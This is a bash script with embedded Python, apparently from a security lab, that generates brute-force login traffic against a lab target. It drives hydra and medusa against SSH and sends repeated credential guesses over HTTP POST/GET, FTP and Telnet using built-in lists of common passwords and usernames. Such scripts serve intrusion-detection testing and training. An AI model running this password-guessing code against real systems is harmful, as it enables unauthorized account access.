#!/usr/bin/env bash
set -euo pipefail

LAB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
# shellcheck source=../lib.sh
source "${LAB_DIR}/lib.sh"

MODE="${1:-ssh_hydra}"
DURATION="${2:-180}"
require_lab_target "$TARGET_IP"
SSH_PORT="${SSH_PORT:-22}"
FTP_PORTS="${FTP_PORTS:-21}"
TELNET_PORTS="${TELNET_PORTS:-23,2323}"
HYDRA_SSH_TASKS="${HYDRA_SSH_TASKS:-1}"
HYDRA_SSH_WAIT="${HYDRA_SSH_WAIT:-10}"
HYDRA_FTP_TASKS="${HYDRA_FTP_TASKS:-4}"
HYDRA_TELNET_TASKS="${HYDRA_TELNET_TASKS:-4}"

WORDLIST="${WORDLIST:-/tmp/edge_lab_passwords.txt}"
USERLIST="${USERLIST:-/tmp/edge_lab_users.txt}"
cat > "$WORDLIST" <<'EOF'
admin
root
password
123456
12345678
student
kali
iot
raspberry
toor
letmein
qwerty
changeme
edge
debian
EOF
cat > "$USERLIST" <<'EOF'
root
admin
student
iot
user
test
debian
rowan
EOF

run_http_login_failures() {
  local duration="$1"
  require_cmd python3
  python3 - "$TARGET_URL" "$HTTP_LOGIN_PATH" "$duration" "$USERLIST" "$WORDLIST" <<'PY'
import http.client
import itertools
import sys
import time
import urllib.parse

target_url, login_path, duration_s, users_path, passwords_path = sys.argv[1:6]
duration = int(duration_s)
parsed = urllib.parse.urlparse(target_url)
scheme = parsed.scheme or "http"
host = parsed.hostname
port = parsed.port or (443 if scheme == "https" else 80)
base_path = parsed.path.rstrip("/")
if not login_path.startswith("/"):
    login_path = "/" + login_path
path = base_path + login_path
if not host:
    raise SystemExit(f"Bad TARGET_URL: {target_url}")

users = [line.strip() for line in open(users_path, encoding="utf-8") if line.strip()]
passwords = [line.strip() for line in open(passwords_path, encoding="utf-8") if line.strip()]
deadline = time.time() + duration
count = 0

for username, password in itertools.cycle(itertools.product(users, passwords)):
    if time.time() >= deadline:
        break
    body = urllib.parse.urlencode({"username": username, "password": password, "submit": "Login"})
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "EdgeLab-LoginProbe/1.0",
        "Connection": "close",
    }
    try:
        cls = http.client.HTTPSConnection if scheme == "https" else http.client.HTTPConnection
        conn = cls(host, port, timeout=2)
        conn.request("POST", path, body=body, headers=headers)
        conn.getresponse().read(256)
        conn.close()
        count += 1
    except OSError:
        pass

    if time.time() >= deadline:
        break
    try:
        cls = http.client.HTTPSConnection if scheme == "https" else http.client.HTTPConnection
        conn = cls(host, port, timeout=2)
        query = urllib.parse.urlencode({"username": username, "password": password, "_": count})
        conn.request("GET", f"{path}?{query}", headers={"User-Agent": "EdgeLab-LoginProbe/1.0", "Connection": "close"})
        conn.getresponse().read(256)
        conn.close()
        count += 1
    except OSError:
        pass

print(f"HTTP login failures sent: {count}")
PY
}

run_socket_login_failures() {
  local protocol="$1"
  local ports="$2"
  local duration="$3"
  require_cmd python3
  python3 - "$TARGET_IP" "$ports" "$duration" "$USERLIST" "$WORDLIST" "$protocol" <<'PY'
import itertools
import socket
import sys
import time

host, ports_s, duration_s, users_path, passwords_path, protocol = sys.argv[1:7]
ports = [int(p.strip()) for p in ports_s.split(",") if p.strip()]
duration = int(duration_s)
users = [line.strip() for line in open(users_path, encoding="utf-8") if line.strip()]
passwords = [line.strip() for line in open(passwords_path, encoding="utf-8") if line.strip()]
deadline = time.time() + duration
count = 0

def recv_some(sock):
    try:
        sock.recv(512)
    except OSError:
        pass

for port, (username, password) in zip(itertools.cycle(ports), itertools.cycle(itertools.product(users, passwords))):
    if time.time() >= deadline:
        break
    try:
        with socket.create_connection((host, port), timeout=2) as sock:
            sock.settimeout(2)
            recv_some(sock)
            if protocol == "ftp":
                sock.sendall(f"USER {username}\r\n".encode("ascii", "ignore"))
                recv_some(sock)
                sock.sendall(f"PASS {password}\r\n".encode("ascii", "ignore"))
                recv_some(sock)
                sock.sendall(b"QUIT\r\n")
            else:
                sock.sendall(f"{username}\r\n".encode("ascii", "ignore"))
                recv_some(sock)
                sock.sendall(f"{password}\r\n".encode("ascii", "ignore"))
                recv_some(sock)
            count += 1
    except OSError:
        pass

print(f"{protocol.upper()} login failures sent: {count}")
PY
}

echo "Generating password/${MODE} for about ${DURATION}s against ${TARGET_IP}"

case "$MODE" in
  ssh|ssh_hydra)
    require_cmd hydra
    echo "SSH hydra target: ${TARGET_IP}:${SSH_PORT} tasks=${HYDRA_SSH_TASKS} wait=${HYDRA_SSH_WAIT}"
    timeout "$DURATION" hydra -L "$USERLIST" -P "$WORDLIST" -s "$SSH_PORT" "ssh://${TARGET_IP}" -t "$HYDRA_SSH_TASKS" -W "$HYDRA_SSH_WAIT" -V || true
    ;;
  ssh_slow)
    require_cmd hydra
    echo "SSH slow hydra target: ${TARGET_IP}:${SSH_PORT}"
    timeout "$DURATION" hydra -L "$USERLIST" -P "$WORDLIST" -s "$SSH_PORT" "ssh://${TARGET_IP}" -t 1 -W 15 -V || true
    ;;
  http_post)
    run_http_login_failures "$DURATION"
    ;;
  http_get)
    run_http_login_failures "$DURATION"
    ;;
  ftp)
    run_socket_login_failures ftp "$FTP_PORTS" "$DURATION"
    ;;
  telnet)
    run_socket_login_failures telnet "$TELNET_PORTS" "$DURATION"
    ;;
  medusa_ssh)
    if command -v medusa >/dev/null 2>&1; then
      timeout "$DURATION" medusa -h "$TARGET_IP" -n "$SSH_PORT" -U "$USERLIST" -P "$WORDLIST" -M ssh -t 1 || true
    else
      "$0" ssh_slow "$DURATION"
    fi
    ;;
  mixed)
    "$0" http_post "$((DURATION / 4 + 1))"
    "$0" ftp "$((DURATION / 4 + 1))"
    "$0" telnet "$((DURATION / 4 + 1))"
    "$0" http_get "$((DURATION / 4 + 1))"
    ;;
  *)
    echo "Unknown mode: ${MODE}" >&2
    echo "Modes: ssh_hydra, ssh_slow, http_post, http_get, ftp, telnet, medusa_ssh, mixed" >&2
    exit 2
    ;;
esac
